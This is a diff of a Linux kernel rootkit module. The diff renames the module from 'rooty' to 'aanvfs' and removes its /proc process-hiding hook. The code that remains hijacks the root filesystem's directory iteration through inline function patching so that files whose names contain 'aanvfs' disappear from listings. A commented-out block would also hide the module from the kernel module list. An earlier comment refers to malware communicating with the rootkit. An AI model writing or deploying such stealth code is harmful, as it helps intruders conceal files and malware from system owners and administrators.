@@ -14,14 +14,12 @@
 
 MODULE_LICENSE("GPL");
 
-int rooty_init(void);
-void rooty_exit(void);
-module_init(rooty_init);
-module_exit(rooty_exit);
-static int (*o_proc_iterate)(struct file *file, struct dir_context *);
+int aanvfs_init(void);
+void aanvfs_exit(void);
+module_init(aanvfs_init);
+module_exit(aanvfs_exit);
 static int (*o_root_iterate)(struct file *file, struct dir_context *);
 
-static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
 static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
 struct my_dir_context {
     filldir_t actor;
@@ -90,8 +88,8 @@ void *get_iterate(const char *path) {
   return ret;
 }
 
-static int rooty_root_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
-  char *get_protect = "rooty";
+static int aanvfs_root_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
+  char *get_protect = "aanvfs";
 
   if (strstr(name,get_protect))
     return 0;
@@ -99,14 +97,14 @@ static int rooty_root_filldir(void *__buff, const char *name, int namelen, loff_
   return o_root_filldir(__buff,name,namelen,offset,ino,d_type);
 }
 
-int rooty_root_iterate ( struct file *file, struct dir_context *ctx )
+int aanvfs_root_iterate ( struct file *file, struct dir_context *ctx )
 {
     int ret;
 
     o_root_filldir = ctx->actor;
 
     fix_it(o_root_iterate);
-    *((filldir_t *)&ctx->actor) = &rooty_root_filldir;
+    *((filldir_t *)&ctx->actor) = &aanvfs_root_filldir;
     ret = o_root_iterate(file, ctx);                  \
     jack_it(o_root_iterate);
 
@@ -114,33 +112,7 @@ int rooty_root_iterate ( struct file *file, struct dir_context *ctx )
 }
 
 
-static int rooty_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
-  long pid;
-  char *endp;
-  /* my_pid is where your malware would communicate to the rootkit what the pid is to hide */
-  long my_pid = 1;
-  unsigned short base = 10;
 
-  pid = simple_strtol(name,&endp,base);
-  if (pid == my_pid)
-    return 0;
-
-  return o_proc_filldir(__buf,name,namelen,offset,ino,d_type);
-}
-
-int rooty_proc_iterate ( struct file *file, struct dir_context *ctx )
-{
-    int ret;
-
-    o_proc_filldir = ctx->actor;
-
-    fix_it(o_proc_iterate);
-    *((filldir_t *)&ctx->actor) = &rooty_proc_filldir;
-    ret = o_proc_iterate(file, ctx);                  \
-    jack_it(o_proc_iterate);
-
-    return ret;
-}
 
 void save_it(void *target, void *new) {
   struct hook *h;
@@ -158,7 +130,7 @@ void save_it(void *target, void *new) {
   list_add(&h->list,&hooked_targets);
 }
 
-int rooty_init(void) {
+int aanvfs_init(void) {
   /* Do kernel module hiding
    * Vorerst auskommentiert
   list_del_init(&__this_module.list);
@@ -167,19 +139,14 @@ int rooty_init(void) {
 
   /* hijack root filesystem */ 
   o_root_iterate = get_iterate("/");
-  save_it(o_root_iterate,rooty_root_iterate);
+  save_it(o_root_iterate,aanvfs_root_iterate);
   jack_it(o_root_iterate);
 
-  /* hijack proc filesystem */
-  o_proc_iterate = get_iterate("/proc");
-  save_it(o_proc_iterate,rooty_proc_iterate);
-  jack_it(o_proc_iterate);
 
   return 0;
 }
 
-void rooty_exit(void) {
+void aanvfs_exit(void) {
   fix_it(o_root_iterate);
-  fix_it(o_proc_iterate);
-  printk("rooty: Module unloaded\n");
+  printk("aanvfs: Module unloaded\n");
 }
